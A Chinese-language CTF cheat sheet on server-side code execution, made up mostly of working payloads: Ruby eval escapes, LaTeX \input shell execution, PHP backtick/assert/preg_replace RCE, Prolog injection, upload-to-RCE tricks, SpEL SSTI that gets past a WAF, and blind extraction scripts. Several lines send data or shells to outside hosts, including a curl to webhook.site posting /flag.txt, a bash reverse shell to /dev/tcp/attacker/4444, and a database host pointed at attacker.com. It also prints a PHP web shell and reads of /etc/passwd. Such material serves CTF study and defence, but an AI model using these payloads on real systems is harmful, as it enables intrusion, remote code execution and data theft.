# CTF Web - 服务端代码执行与访问类攻击

## 目录
- [Ruby 代码注入](#ruby-代码注入)
  - [instance_eval 逃逸](#instance_eval-逃逸)
  - [绕过关键字黑名单](#绕过关键字黑名单)
  - [数据外带](#数据外带)
- [Ruby ObjectSpace 内存扫描提取 flag（Tokyo Westerns 2016）](#ruby-objectspace-内存扫描提取-flagtokyo-westerns-2016)
- [Perl open() RCE](#perl-open-rce)
- [LaTeX 注入 RCE（Hack.lu CTF 2012）](#latex-注入-rcehacklu-ctf-2012)
- [服务端 JS eval 黑名单绕过](#服务端-js-eval-黑名单绕过)
- [PHP preg_replace /e 修饰符 RCE（PlaidCTF 2014）](#php-preg_replace-e-修饰符-rceplaidctf-2014)
- [字符长度限制下的 PHP 反引号执行（EasyCTF 2017）](#字符长度限制下的-php-反引号执行easyctf-2017)
- [PHP assert() 字符串求值注入（CSAW CTF 2016）](#php-assert-字符串求值注入csaw-ctf-2016)
- [Prolog 注入（PoliCTF 2015）](#prolog-注入polictf-2015)
- [ReDoS 作为时间侧信道](#redos-作为时间侧信道)
- [文件上传到 RCE 的技术](#文件上传到-rce-的技术)
  - [.htaccess 上传绕过](#htaccess-上传绕过)
  - [PHP 日志投毒](#php-日志投毒)
  - [Python .so 劫持（by Siunam）](#python-so-劫持by-siunam)
  - [Gogs 符号链接 RCE（CVE-2025-8110）](#gogs-符号链接-rcecve-2025-8110)
  - [ZipSlip + SQLi](#zipslip--sqli)
- [从 Cookie 触发的 PHP 反序列化](#从-cookie-触发的-php-反序列化)
- [PHP extract() / register_globals 变量覆盖（SecuInside 2013）](#php-extract--register_globals-变量覆盖secuinside-2013)
- [XPath 盲注（BaltCTF 2013）](#xpath-盲注baltctf-2013)
- [API 过滤/查询参数注入](#api-过滤查询参数注入)
- [HTTP 响应头数据隐藏](#http-响应头数据隐藏)
- [WebSocket 批量赋值](#websocket-批量赋值)
- [Thymeleaf SpEL SSTI + Spring FileCopyUtils 绕过 WAF（ApoorvCTF 2026）](#thymeleaf-spel-ssti--spring-filecopyutils-绕过-wafapoorvctf-2026)
- [PHP eval() 函数正则绕过：current(getallheaders())（RCTF 2018）](#php-eval-函数正则绕过currentgetallheadersrctf-2018)
- [Python f-string 格式注入盲提取（Meepwn CTF Quals 2018）](#python-f-string-格式注入盲提取meepwn-ctf-quals-2018)

注入类攻击（SQLi、SSTI、SSRF、XXE、命令注入、PHP 类型混淆、PHP 文件包含）见 [server-side.md](server-side.md)。反序列化攻击（Java、Pickle）与条件竞争见 [server-side-deser.md](server-side-deser.md)。CVE 专项利用、路径穿越绕过、Flask/Werkzeug 调试以及其他进阶技巧见 [server-side-advanced.md](server-side-advanced.md)。

*另见：[server-side-exec-2.md](server-side-exec-2.md) —— SQLi 关键字碎片化绕过、SQL WHERE ORDER BY 绕过、经 DNS 记录注 SQL、bash 花括号展开、Common Lisp reader macro 注入、PHP7 OPcache + LD_PRELOAD 绕过、wget 文件名技巧、tar 文件名注入、PNG/PHP 多语言上传、编辑器备份文件泄露、date -f 读文件、Apache mod_rewrite 绕过、PHP ReDoS 代码跳过。*

---

<a id="ruby-code-injection"></a>
## Ruby 代码注入

<a id="instance_eval-breakout"></a>
### instance_eval 逃逸
```ruby
# Template: apply_METHOD('VALUE')
# Inject VALUE as: valid');PAYLOAD#
# Result: apply_METHOD('valid');PAYLOAD#')
```

<a id="bypassing-keyword-blocklists"></a>
### 绕过关键字黑名单
| 被拦截 | 替代方案 |
|---------|-------------|
| `File.read` | `Kernel#open` 或类辅助方法 |
| `File.write` | `open('path','w'){|f|f.write(data)}` |
| `system`/`exec` | `open('\|cmd')`、`%x[cmd]`、`Process.spawn` |
| `IO` | `Kernel#open` |

<a id="exfiltration"></a>
### 数据外带
```ruby
open('public/out.txt','w'){|f|f.write(read_file('/flag.txt'))}
# Or: Process.spawn("curl https://webhook.site/xxx -d @/flag.txt").tap{|pid| Process.wait(pid)}
```

**关键点：** Ruby 的 `instance_eval` 和 `Kernel#open` 是常见的注入汇点。当 `File`、`system`、`IO` 等关键字被拦截时，改用 `open('|cmd')` 或 `Process.spawn` —— Ruby 内置了大量执行命令的途径，能绕过简单黑名单。

---

<a id="ruby-objectspace-memory-scanning-for-flag-extraction-tokyo-westerns-2016"></a>
## Ruby ObjectSpace 内存扫描提取 flag（Tokyo Westerns 2016）

在直接访问变量被禁止的 Ruby 沙箱题中，用 `ObjectSpace.each_object` 扫描整个堆查找 flag 字符串。

```ruby
# When you can't access the flag variable directly:
# Method 1: ObjectSpace heap scan
ObjectSpace.each_object(String) { |x| x[0..3] == "TWCT" and print x }

# Method 2: Monkey-patch to access private methods
# If object 'p' has private method 'flag':
def p.x; flag end; p.x

# Method 3: Use send() to bypass private visibility
p.send(:flag)

# Method 4: Use method() to get method object
p.method(:flag).call
```

**关键点：** Ruby 的 `ObjectSpace.each_object(String)` 会遍历 Ruby 堆中所有存活 String，包括存于私有变量或内部状态里的字符串。用已知 flag 前缀过滤，即使没有任何直接引用也能取出 flag。

---

<a id="perl-open-rce"></a>
## Perl open() RCE
旧式双参数 `open()` 允许命令注入：
```perl
open(my $fh, $user_controlled_path);  # 2-arg open interprets mode chars
# Exploit: "|command_here" or "command|"
```

**关键点：** Perl 的双参数 `open()` 会把文件名中的模式字符解释为模式。首尾的管道符（`|`）会导致命令执行。任何用双参数形式打开用户可控文件名的 Perl CGI 或后端都存在 RCE。

---

<a id="latex-injection-rce-hacklu-ctf-2012"></a>
## LaTeX 注入 RCE（Hack.lu CTF 2012）

**模式：** 编译用户提交 LaTeX 的 Web 应用（PDF 生成服务、论文渲染器）可通过 `\input` 的管道语法执行命令。

**读取文件：**
```latex
\begingroup\makeatletter\endlinechar=\m@ne\everyeof{\noexpand}
\edef\x{\endgroup\def\noexpand\filecontents{\@@input"/etc/passwd" }}\x
\filecontents
```

**执行命令：**
```latex
\input{|"id"}
\input{|"ls /home/"}
\input{|"cat /flag.txt"}
```

**独立文档形式的完整 payload：**
```latex
\documentclass{article}
\begin{document}
{\catcode`_=12 \ttfamily
\input{|"ls /home/user/"}
}
\end{document}
```

**关键点：** LaTeX 的 `\input{|"cmd"}` 语法会直接把 shell 命令输出管道进文档。内部宏 `\@@input` 则不经过 shell，直接读文件。用 `\catcode` 调整来处理命令输出中的特殊字符（下划线、花括号）。

**检测：** 任何接受 `.tex` 输入、提供 PDF 预览/编译服务或"渲染 LaTeX"功能的端点。

---

<a id="server-side-js-eval-blocklist-bypass"></a>
## 服务端 JS eval 黑名单绕过

**用括号表示法中的字符串拼接绕过：**
```javascript
row['con'+'structor']['con'+'structor']('return this')()
// Also: template literals, String.fromCharCode, reverse string
```

**关键点：** 过滤 `require`、`process`、`constructor` 等关键字的 JavaScript `eval` 黑名单，可用括号表示法拼接字符串绕过。`['con'+'structor']` 会调到 `Function` 构造函数，它能从字符串创建函数 —— 等价于 `eval`，却没有可被拦截的关键字。

---

<a id="php-preg_replace-e-modifier-rce-plaidctf-2014"></a>
## PHP preg_replace /e 修饰符 RCE（PlaidCTF 2014）

**模式：** PHP 的 `preg_replace()` 带 `/e` 修饰符时，会把替换串当作 PHP 代码求值。配合对用户可控输入的 `unserialize()`，可构造序列化对象，其属性触发走 `preg_replace("/pattern/e", "system('cmd')", ...)` 的代码路径。

```php
// Vulnerable code pattern:
preg_replace($pattern . "/e", $replacement, $input);
// If $replacement is attacker-controlled:
$replacement = 'system("cat /flag")';
```

**通过对象注入（POP 链）：**
```php
// Craft serialized object with OutputFilter containing /e pattern
$filter = new OutputFilter("/^./e", 'system("cat /flag")');
$cookie = serialize($filter);
// Send as cookie → unserialize triggers preg_replace with /e
```

**关键点：** `/e` 修饰符（PHP 5.5 弃用、7.0 移除）把 `preg_replace` 变成 eval 汇点。打 PHP 5.x 目标时先检查正则里是否有 `/e`。配合 `unserialize()`，可通过同时控制 pattern 与 replacement 的 POP gadget 链实现 RCE。

---

<a id="php-backtick-eval-under-character-limit-easyctf-2017"></a>
## 字符长度限制下的 PHP 反引号执行（EasyCTF 2017）

**模式：** PHP 反引号运算符执行 shell 命令。当 `eval()` 输入有字符数限制时，反引号能用极少字符完成命令执行。

```php
// 11-character RCE via eval()
echo`cat *`;

// 8-character directory listing
echo`ls`;

// 10-character parameterized command execution
`$_GET[0]`;

// 12-character reverse shell trigger
`$_GET[x]`;
// Then pass the full command via GET parameter: ?x=bash -i >& /dev/tcp/attacker/4444 0>&1
```

**字符数对比：**
```text
echo`cat *`;              // 12 chars - read all files
echo`ls`;                 // 9 chars  - list directory
`$_GET[0]`;               // 11 chars - parameterized execution
system('id');             // 13 chars - standard approach
exec('id');               // 11 chars - also standard
```

**关键点：** PHP 反引号等价于 `shell_exec()`。当 `eval()` 有字符数限制时，`` echo`cmd` `` 最短仅需 8 个字符即可执行 shell。`$_GET[0]` 技巧把真正的 payload 挪到 URL 参数里，既让 eval 载荷保持极短，又完全绕过了长度限制。

---

<a id="php-assert-string-evaluation-injection-csaw-ctf-2016"></a>
## PHP assert() 字符串求值注入（CSAW CTF 2016）

PHP 的 `assert()` 会把字符串参数当作 PHP 代码求值。当用户输入被拼进 assert() 时即可代码注入。

```php
// Vulnerable code pattern:
assert("strpos('$page', '..') === false");

// Injection payload via $page parameter:
// ' and die(show_source('templates/flag.php')) or '
// Results in: assert("strpos('' and die(show_source('templates/flag.php')) or '', '..') === false");

// URL: ?page=' and die(show_source('templates/flag.php')) or '
// Alternative payloads:
// ' and die(system('cat /flag')) or '
// '.die(highlight_file('config.php')).'
```

**关键点：** 带字符串参数的 PHP `assert()` 行为等同 `eval()`。该特性在 PHP 7.2 弃用、8.0 移除，但遗留系统仍有风险。在源码（尤其是泄露的 `.git` 目录）中搜索 `assert()`。

---

<a id="prolog-injection-polictf-2015"></a>
## Prolog 注入（PoliCTF 2015）

**模式：** 服务把用户输入直接传入 Prolog 谓词调用。闭合原谓词后追加 Prolog 目标以实现命令执行。

```text
# Original query: hanoi(USER_INPUT)
# Injection: close hanoi(), chain exec()
3), exec(ls('/')), write('\n'
3), exec(cat('/flag')), write('\n'
```

**识别：** 报错含 "Prolog initialisation failed" 或 "Operator expected" 可暴露后端。SWI-Prolog 的 `exec/1` 和 `shell/1` 执行系统命令。

**关键点：** Prolog 目标用 `,`（AND）串联。注入 `3), exec(cmd)` 会闭合原谓词并追加任意 Prolog 目标，思路类似 SQL 注入但针对逻辑编程后端。除 `exec` 外还要检查 `process_create/3` 和 `read_file_to_string/3`。

---

<a id="redos-as-timing-oracle"></a>
## ReDoS 作为时间侧信道

**模式（0xClinic）：** 把用户提供的正则拿去匹配文件内容。构造只有在某字符命中时才触发指数级回溯的正则。

```python
def leak_char(known_prefix, position):
    for c in string.printable:
        pattern = f"^{re.escape(known_prefix + c)}(a+)+$"
        start = time.time()
        resp = requests.post(url, json={"title": pattern})
        if time.time() - start > threshold:
            return c
```

**结合路径穿越** 可以打 `/proc/1/environ`（密钥）与 `/proc/self/cmdline`。

---

<a id="file-upload-to-rce-techniques"></a>
## 文件上传到 RCE 的技术

**关键点：** 只要能控制文件扩展名（`.htaccess`、`.php`、`.so`）或上传路径（路径穿越），文件上传漏洞就能升级为 RCE。优先尝试上传服务端配置文件（`.htaccess`）、共享库（`.so`），直接代码上传被拦时退而使用日志投毒。

<a id="htaccess-upload-bypass"></a>
### .htaccess 上传绕过
1. 上传 `.htaccess`：`AddType application/x-httpd-php .lol`
2. 上传 `rce.lol`：`<?php system($_GET['cmd']); ?>`
3. 访问 `rce.lol?cmd=cat+flag.txt`

<a id="php-log-poisoning"></a>
### PHP 日志投毒
1. 在 User-Agent 头里写 PHP payload
2. 用路径穿越包含：`....//....//....//var/log/apache2/access.log`

<a id="python-so-hijacking-by-siunam"></a>
### Python .so 劫持（by Siunam）
1. 编译：`gcc -shared -fPIC -o auth.so malicious.c`，内部用 `__attribute__((constructor))`
2. 路径穿越上传：`{"filename": "../utils/auth.so"}`
3. 删除 .pyc 强制重新导入：`{"filename": "../utils/__pycache__/auth.cpython-311.pyc"}`

参考：https://siunam321.github.io/research/python-dirty-arbitrary-file-write-to-rce-via-writing-shared-object-files-or-overwriting-bytecode-files/

<a id="gogs-symlink-rce-cve-2025-8110"></a>
### Gogs 符号链接 RCE（CVE-2025-8110）
1. 建仓库，`ln -s .git/config malicious_link`，push
2. 通过 API 更新 `malicious_link` → 覆盖 `.git/config`
3. 在 `core.sshCommand` 里注入反弹 shell

<a id="zipslip--sqli"></a>
### ZipSlip + SQLi
上传含符号链接的 zip 实现文件读取，用路径穿越实现文件写入。

---

<a id="php-deserialization-from-cookies"></a>
## 从 Cookie 触发的 PHP 反序列化
```php
O:8:"FilePath":1:{s:4:"path";s:8:"flag.txt";}
```
把 cookie 替换为 base64 编码的恶意序列化数据。

**关键点：** Cookie 里出现 base64 编码数据，很可能就是 `unserialize()` 的目标。构造一个 `path` 属性指向 `flag.txt` 的序列化对象，或注入 POP 链实现 RCE。先解码现有 cookie 以确定类名与属性结构。

---

<a id="php-extract--register_globals-variable-overwrite-secuinside-2013"></a>
## PHP extract() / register_globals 变量覆盖（SecuInside 2013）

**模式：** `extract($_GET)` 或 `extract($_POST)` 会用用户提供的值覆盖 PHP 内部变量，从而实现数据库凭据注入、路径操控或认证绕过。

```php
// Vulnerable pattern
if (!ini_get("register_globals")) extract($_GET);
// Attacker-controlled: $_BHVAR['db']['host'], $_BHVAR['path_layout'], etc.
```

```text
GET /?_BHVAR[db][host]=attacker.com&_BHVAR[db][user]=root&_BHVAR[db][pass]=pass
```

**关键点：** `extract()` 把数组键导入为局部变量。覆盖数据库连接参数使其指向攻击者控制的 MySQL 服务器，再返回精心构造的查询结果（文件路径、凭据等）。

**检测：** 在源码中搜索 `extract($_GET)`、`extract($_POST)`、`extract($_REQUEST)`。PHP 的 `register_globals`（5.4 移除）曾全局产生同样效果。

---

<a id="xpath-blind-injection-baltctf-2013"></a>
## XPath 盲注（BaltCTF 2013）

**模式：** 用户输入拼接进 XPath 查询时，可通过布尔型或响应长度侧信道实现盲提取。

```text
-- Injection in sort/filter parameter:
1' and substring(normalize-space(../../../node()),1,1)='a' and '2'='2

-- Boolean detection: response length > threshold = true
-- Extract character by character:
for pos in range(1, 100):
    for c in string.printable:
        payload = f"1' and substring(normalize-space(../../../node()),{pos},1)='{c}' and '2'='2"
        if len(requests.get(url, params={'sort': payload}).text) > 1050:
            result += c; break
```

**关键点：** XPath 注入与 SQL 注入相似，但目标是 XML 数据存储。`normalize-space()` 去掉空白，`../../../` 遍历 XML 树。布尔侧信道依赖响应体大小差异（条件为真的查询返回更多结果）。

---

<a id="api-filterquery-parameter-injection"></a>
## API 过滤/查询参数注入

**模式（Poacher Supply Chain）：** API 接受 JSON filter，多加字段即可暴露内部数据。
```bash
# UI sends: filter={"region":"all"}
# Inject:   filter={"region":"all","caseId":"*"}
# May return: case_detail, notes, proof codes
```

---

<a id="http-response-header-data-hiding"></a>
## HTTP 响应头数据隐藏

Proof/flag 藏在自定义响应头里（如 `x-archive-tag`、`x-flag`）：
```bash
curl -sI "https://target/api/endpoint?seed=<seed>"
curl -sv "https://target/api/endpoint" 2>&1 | grep -i "x-"
```

**关键点：** 藏在自定义 HTTP 响应头里的 flag 与 proof code（如 `x-flag`、`x-archive-tag`）在浏览器渲染的页面里看不到。始终用 `curl -sI` 或浏览器开发者工具检查响应头，尤其是 API 端点。

---

<a id="websocket-mass-assignment"></a>
## WebSocket 批量赋值
```json
{"username": "user", "isAdmin": true}
```
处理函数不过滤字段 → 提权。

**关键点：** WebSocket 处理函数若把 JSON 属性直接映射到对象而不做白名单校验，就允许批量赋值。在 JSON 里加上 `isAdmin`、`role`、`balance` 这类特权字段 —— 只要服务端没有显式过滤，它们就会覆盖对象对应属性。

---

<a id="thymeleaf-spel-ssti--spring-filecopyutils-waf-bypass-apoorvctf-2026"></a>
## Thymeleaf SpEL SSTI + Spring FileCopyUtils 绕过 WAF（ApoorvCTF 2026）

**模式（Sugar Heist）：** Spring Boot 应用的 Thymeleaf 模板预览端点。WAF 拦截标准文件 I/O 类（`Runtime`、`ProcessBuilder`、`FileInputStream`），但不拦 Spring 框架自带工具类。

**攻击链：**
1. **批量赋值** 拿到 admin 角色（注册 JSON 里加 `"role": "ADMIN"`）
2. **SpEL 注入** 走模板预览端点
3. **绕过 WAF**：改用 `org.springframework.util.FileCopyUtils` 而非被拦的类

```bash
# Step 1: Register as admin via mass assignment
curl -X POST http://target/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"pass","email":"a@b.com","role":"ADMIN"}'

# Step 2: Directory listing via SpEL (java.io.File not blocked)
curl -X POST http://target/api/admin/preview \
  -H "Content-Type: application/json" \
  -H "X-Api-Token: <token>" \
  -d '{"template": "${T(java.util.Arrays).toString(new java.io.File(\"/app\").list())}"}'

# Step 3: Read flag using Spring FileCopyUtils + string concat to bypass WAF
curl -X POST http://target/api/admin/preview \
  -H "Content-Type: application/json" \
  -H "X-Api-Token: <token>" \
  -d '{"template": "${new java.lang.String(T(org.springframework.util.FileCopyUtils).copyToByteArray(new java.io.File(\"/app/fl\"+\"ag.txt\")))}"}'
```

**关键点：** Distroless 容器里没有 shell（`/bin/sh`），即便没有 WAF，`Runtime.exec()` 也无用武之地。Spring 的 `FileCopyUtils.copyToByteArray()` 无需拉起进程即可读文件。字符串拼接（`"fl"+"ag.txt"`）能绕过 WAF 的静态关键字匹配。

**其他 SpEL 读文件 payload：**
```text
${T(org.springframework.util.StreamUtils).copyToString(new java.io.FileInputStream("/flag.txt"), T(java.nio.charset.StandardCharsets).UTF_8)}
${new String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get("/flag.txt")))}
```

**检测：** 使用 Spring Boot 且存在 `/api/admin/preview` 或类似模板渲染端点。响应中出现 Thymeleaf 报错。请求带 `X-Api-Token` 头。

---

<a id="php-eval-function-regex-bypass-via-currentgetallheaders-rctf-2018"></a>
## PHP eval() 函数正则绕过：current(getallheaders())（RCTF 2018）

**模式（calc）：** 一个 PHP 沙箱用递归正则 `/[^\W_]+\((?R)?\)/` 确认字符串是"单个函数调用"（标识符 + 括号）后，才把用户输入交给 `eval()`。该过滤拒绝下划线、字母前数字和多语句体，因此 `system($_GET[...])` 这类明显 payload 直接失效。

**绕过：** `current(getallheaders())` 是一个裸函数调用表达式，能通过正则。运行时它返回第一个 HTTP 头的值 —— 完全由攻击者控制的字符串 —— 随后可作为内层 `eval` 或 `assert` 的输入。

```bash
curl "http://target/?cmd=eval(current(getallheaders()));" \
     -H "Zzz: system('cat /flag');"
```

- `getallheaders()` 返回请求头的关联数组。
- `current()` 取第一个元素（PHP 的头部顺序足够稳定：把你的头放在最前面，或用 `Zzz` 这类在字母序上占优的名字，就能让它落到索引 0）。
- 外层 `eval` 消费返回的字符串并执行。

**关键点：** 任何只检查表达式"形式"（函数名 + 括号）的正则过滤，都可被"返回值即下一段 payload"的函数击穿。重点找能读攻击者可控存储的 PHP 函数（`getallheaders`、`get_defined_vars`、`file_get_contents('php://input')`、`current($_SERVER)`）—— 它们能把任意字符串偷渡过语法过滤。

**参考：** RCTF 2018 — writeup 10150

---

<a id="python-f-string-format-injection-blind-extraction-meepwn-ctf-quals-2018"></a>
## Python f-string 格式注入盲提取（Meepwn CTF Quals 2018）

**模式：** Python 3.6+ 应用在 f-string 模板里求值用户可控内容（`f"... {user} ..."`）。显式引号被过滤，因此 `{FLAG}` 能返回 flag 的 `repr()`，但攻击者无法拼接字符串，也无法用字符串参数调用函数。

**绕过 —— 布尔短路 + 格式说明符：**
```python
# The f-string spec lets you use comparisons and arithmetic inside {}.
# `FLAG > 'c'` evaluates to True or False depending on lexicographic order.
# `True or 14` short-circuits to True; False triggers the fallback 14 which
# is then formatted as hex ('e'). This turns the template into a one-bit
# oracle that reveals 'FLAG[0] > c' per request.
payload = "{FLAG>'c' or 14:x}"
# Request returns "True" or "e" — the attacker reads one comparison bit.
```

不断调整比较字符，对 `FLAG` 的每个字节做二分查找，全程无需在模板之外输出任何被禁的引号。

**关键点：** f-string 会求值 `{}` 内的完整 Python 表达式。任何只检查外围源码的过滤（比如"不许引号、不许 `__class__`"）都会失败，因为表达式可以使用作用域内已有标识符、比较运算，以及 `:x`/`:b`/`:c` 格式转换，把任意值变成攻击者可读的输出。直接字符串操作被禁时，改用与既有常量或其他变量的比较，逐位读出结果。

**参考：** Meepwn CTF Quals 2018 — writeups 10433、10434

---

*另见：[server-side.md](server-side.md) —— 核心注入攻击（SQLi、SSTI、SSRF、XXE、命令注入、PHP 类型混淆、PHP 文件包含）。*
